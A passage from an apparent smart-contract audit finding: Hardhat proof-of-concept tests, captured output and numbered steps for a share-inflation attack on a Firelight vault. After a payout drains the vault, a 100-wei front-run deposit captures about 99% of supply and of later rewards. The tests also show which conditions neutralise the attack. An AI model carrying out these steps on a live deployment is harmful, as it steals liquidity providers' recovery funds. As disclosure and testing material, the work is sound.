      await v.connect(alice).deposit(U(1_000_000), alice.address)
      await time.increase(config.period_configuration_duration)

      const S = await v.totalSupply()
      // Pay out everything except R, so the vault is left holding exactly R.
      await v
        .connect(payout_signer)
        .payout(payout_receiver.address, (await v.totalAssets()) - R, await v.currentPeriodStart())
      expect(await v.totalAssets(), 'residue is exactly R').to.equal(R)

      await utils.mintAndApprove(D, attacker)
      await v.connect(attacker).deposit(D, attacker.address)
      const atkShares = await v.balanceOf(attacker.address)
      const supply = await v.totalSupply()

      const REWARD = U(200_000)
      await utils.mintAndApprove(REWARD, funder)
      await t.connect(funder).transfer(v.target, REWARD)
      const atkClaim = await v.previewRedeem(atkShares)

      const pctSupply = Number((atkShares * 10_000n) / supply) / 100
      const pctInflow = Number((atkClaim * 10_000n) / REWARD) / 100
      // eslint-disable-next-line no-console
      console.log(
        `      residue=${R.toString().padEnd(4)} dust=${D} -> attacker holds ${pctSupply.toFixed(2)}% of supply, ` +
          `takes ${pctInflow.toFixed(2)}% of a ${REWARD} inflow  (S=${S})`,
      )
    }
  })

  it('residue == deposits that landed after the capture-period start: one 10,000 fXRP mid-period deposit kills it', async () => {
    const ctx = await loadFixture(
      deployVault.bind(null, { decimals: DEC, initial_deposit_limit: U(10_000_000) }),
    )
    const { token_contract: t, firelight_vault: v, payout_signer, payout_receiver, users, utils, config } = ctx
    const [alice, funder, attacker] = users

    await utils.mintAndApprove(U(1_000_000), alice)
    await v.connect(alice).deposit(U(1_000_000), alice.address)
    await time.increase(config.period_configuration_duration)

    const capTs = await v.currentPeriodStart()
    const snapshot = await v.totalAssetsAt(capTs)

    // An ordinary LP deposits mid-period, BEFORE any incident is filed.
    await utils.mintAndApprove(U(10_000), funder)
    await v.connect(funder).deposit(U(10_000), funder.address)
    const live = await v.totalAssets()

    // Maximal payout. paidAmount is capped by totalAssetsAt(capturePeriodStart).
    await v.connect(payout_signer).payout(payout_receiver.address, U(5_000_000), capTs)
    const residue = await v.totalAssets()
    // eslint-disable-next-line no-console
    console.log(
      `      snapshot(capturePeriodStart)=${snapshot}  live=${live}  residue after maximal payout=${residue}`,
    )
    expect(residue, 'residue equals exactly the post-snapshot deposit').to.equal(live - snapshot)

    await utils.mintAndApprove(100n, attacker)
    await v.connect(attacker).deposit(100n, attacker.address)
    const REWARD = U(200_000)
    await utils.mintAndApprove(REWARD, alice)
    await t.connect(alice).transfer(v.target, REWARD)
    const atkClaim = await v.previewRedeem(await v.balanceOf(attacker.address))
    // eslint-disable-next-line no-console
    console.log(
      `      attacker claim on a ${REWARD} reward = ${atkClaim} base units ` +
        `(${ethers.formatUnits(atkClaim, DEC)} fXRP) -- attack is dead`,
    )
    expect(atkClaim * 1000n, 'attacker take is negligible').to.be.lt(REWARD)
  })

  it('bound on the ceiling: the first ordinary-sized deposit after the attack collapses the attacker fraction', async () => {
    const ctx = await loadFixture(
      deployVault.bind(null, { decimals: DEC, initial_deposit_limit: U(10_000_000) }),
    )
    const { token_contract: t, firelight_vault: v, payout_signer, payout_receiver, users, utils, config } = ctx
    const [alice, funder, attacker] = users

    await utils.mintAndApprove(U(1_000_000), alice)
    await v.connect(alice).deposit(U(1_000_000), alice.address)
    await time.increase(config.period_configuration_duration)
    await v.connect(payout_signer).payout(payout_receiver.address, U(5_000_000), await v.currentPeriodStart())
    expect(await v.totalAssets()).to.equal(0n)

    await utils.mintAndApprove(100n, attacker)
    await v.connect(attacker).deposit(100n, attacker.address)
    const before = Number(((await v.balanceOf(attacker.address)) * 1_000_000n) / (await v.totalSupply())) / 10_000

    // One ordinary depositor puts in 1 fXRP. The share price is no longer degenerate after this.
    await utils.mintAndApprove(U(1), funder)
    await v.connect(funder).deposit(U(1), funder.address)
    const after = Number(((await v.balanceOf(attacker.address)) * 1_000_000_000n) / (await v.totalSupply())) / 10_000_000

    // A later inflow now splits on the post-deposit ratio, not the post-drain one.
    const REWARD = U(200_000)
    await utils.mintAndApprove(REWARD, alice)
    await t.connect(alice).transfer(v.target, REWARD)
    const atkClaim = await v.previewRedeem(await v.balanceOf(attacker.address))
    // eslint-disable-next-line no-console
    console.log(
      `      attacker fraction of supply: ${before.toFixed(2)}% before a 1 fXRP deposit, ` +
        `${after.toFixed(4)}% after; claim on a later ${REWARD} inflow = ${atkClaim} base units`,
    )
    expect(after).to.be.lessThan(0.02)
  })

  it('narrowing: a payout executed in capturePeriod + 1 leaves a whole period of deposits as residue', async () => {
    const ctx = await loadFixture(
      deployVault.bind(null, { decimals: DEC, initial_deposit_limit: U(10_000_000) }),
    )
    const { firelight_vault: v, payout_signer, payout_receiver, users, utils, config } = ctx
    const [alice, funder, attacker] = users

    await utils.mintAndApprove(U(1_000_000), alice)
    await v.connect(alice).deposit(U(1_000_000), alice.address)
    await time.increase(config.period_configuration_duration)

    const capTs = await v.currentPeriodStart()
    const capPeriod = await v.currentPeriod()

    // Move into capturePeriod + 1; payout is still permitted there (_isPeriodInPayoutWindow).
    await time.increase(config.period_configuration_duration)
    expect(await v.currentPeriod()).to.equal(capPeriod + 1n)

    await utils.mintAndApprove(U(300_000), funder)
    await v.connect(funder).deposit(U(300_000), funder.address)

    await v.connect(payout_signer).payout(payout_receiver.address, U(5_000_000), capTs)
    const residue = await v.totalAssets()

    await utils.mintAndApprove(100n, attacker)
    await v.connect(attacker).deposit(100n, attacker.address)
    const pct = Number(((await v.balanceOf(attacker.address)) * 1_000_000n) / (await v.totalSupply())) / 10_000
    // eslint-disable-next-line no-console
    console.log(
      `      payout in capturePeriod+1: residue=${residue}, attacker 100 wei -> ${pct.toFixed(2)}% of supply`,
    )
    expect(residue).to.equal(U(300_000))
    expect(pct).to.be.lessThan(0.01)
  })
})
```

**Actual captured output** (`npx hardhat test test/zz_poc_postdrain_residue.js`):

```
  F-10 preconditions: post-payout residue is what decides the attack
      residue=0    dust=100 -> attacker holds 99.00% of supply, takes 99.00% of a 200000000000 inflow  (S=1000000000000)
      residue=1    dust=100 -> attacker holds 98.03% of supply, takes 98.03% of a 200000000000 inflow  (S=1000000000000)
      residue=10   dust=100 -> attacker holds 90.09% of supply, takes 90.09% of a 200000000000 inflow  (S=1000000000000)
      residue=100  dust=100 -> attacker holds 49.75% of supply, takes 49.75% of a 200000000000 inflow  (S=1000000000000)
      residue=1000 dust=100 -> attacker holds 9.08% of supply, takes 9.08% of a 200000000000 inflow  (S=1000000000000)
    ✔ residue ladder: attacker share of supply and of the next inflow, as a function of R (1000ms)
      snapshot(capturePeriodStart)=1000000000000  live=1010000000000  residue after maximal payout=10000000000
      attacker claim on a 200000000000 reward = 2099 base units (0.002099 fXRP) -- attack is dead
    ✔ residue == deposits that landed after the capture-period start: one 10,000 fXRP mid-period deposit kills it (78ms)
      attacker fraction of supply: 99.01% before a 1 fXRP deposit, 0.0100% after; claim on a later 200000000000 inflow = 19998080 base units
    ✔ bound on the ceiling: the first ordinary-sized deposit after the attack collapses the attacker fraction (76ms)
      payout in capturePeriod+1: residue=300000000000, attacker 100 wei -> 0.00% of supply
    ✔ narrowing: a payout executed in capturePeriod + 1 leaves a whole period of deposits as residue (81ms)


  4 passing (1s)
```

### Attack steps in prose (supplementary to the runnable code above)

1. Observe an incident on Firelight whose approved assessment loss meets or exceeds the vault's `totalAssets()` after the first-loss buffer is applied, where it is the last unresolved incident for its period and the previous period, and where the payout executes in the capture period (so that residue is negligible — see Precondition 2).
2. Watch the mempool for `IncidentManager.approveCurrentAssessment(incidentId)`. That transaction drains the vault via `_executePayout -> vault.payout` and clears the deposit block via `_decreaseIncident -> setActiveIncident(period, false)`.
3. In the next transaction, call `FirelightVault.deposit(100, attacker)`. `_convertToSharesTotals` returns `100 * (totalSupply + 1)`, granting \~99% of total supply for 100 wei.
4. Hold until the LPs' recovery premium arrives. Every share-less inflow that lands **before the next ordinary-sized deposit** — `VaultRewardDistributor.distributeRewards`, `distributeIncentive`, or a plain transfer — is split \~99/1 in the attacker's favour. The first ordinary deposit restores a sane share price and dilutes the attacker to proportional participation (measured: 99.01% -> 0.0100% after a 1 fXRP deposit), so the realistic take is the premium arriving in that window — which is exactly the LPs' post-incident recovery.
5. Realise: `redeem(shares)`, wait for the withdrawal period to pass, `claimWithdraw(period)`. Measured in File 1: 198,019.802080 fXRP out, for 100 wei in.
